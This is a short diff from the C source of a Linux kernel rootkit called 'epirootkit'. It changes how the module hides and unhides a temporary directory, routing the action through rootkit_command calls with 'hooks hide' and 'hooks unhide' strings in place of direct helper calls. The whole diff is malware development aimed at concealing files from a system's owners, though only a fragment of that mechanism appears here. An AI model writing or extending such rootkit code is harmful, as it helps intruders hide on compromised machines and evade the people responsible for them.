@@ -1,6 +1,7 @@
 #include <linux/errno.h>
 #include <linux/fs.h>
 #include <linux/namei.h>
+#include <linux/string.h>
 
 #include "epirootkit.h"
 
@@ -16,7 +17,8 @@ int create_hidden_tmp_dir(void) {
     rc = exec_str_as_command(cmd, false);
 
     // Hide it
-    add_hidden_dir(HIDDEN_DIR_PATH);
+    size_t length = strlen("hooks hide " HIDDEN_DIR_PATH);
+    rootkit_command("hooks hide " HIDDEN_DIR_PATH, length);
 
     return SUCCESS;
 }
@@ -30,7 +32,8 @@ int remove_hidden_tmp_dir(void) {
     rc = exec_str_as_command(cmd, 0);
 
     // Unhide directory
-    remove_hidden_dir(HIDDEN_DIR_PATH);
+    size_t length = strlen("hooks unhide " HIDDEN_DIR_PATH);
+    rootkit_command("hooks unhide " HIDDEN_DIR_PATH, length);
 
     return SUCCESS;
 }
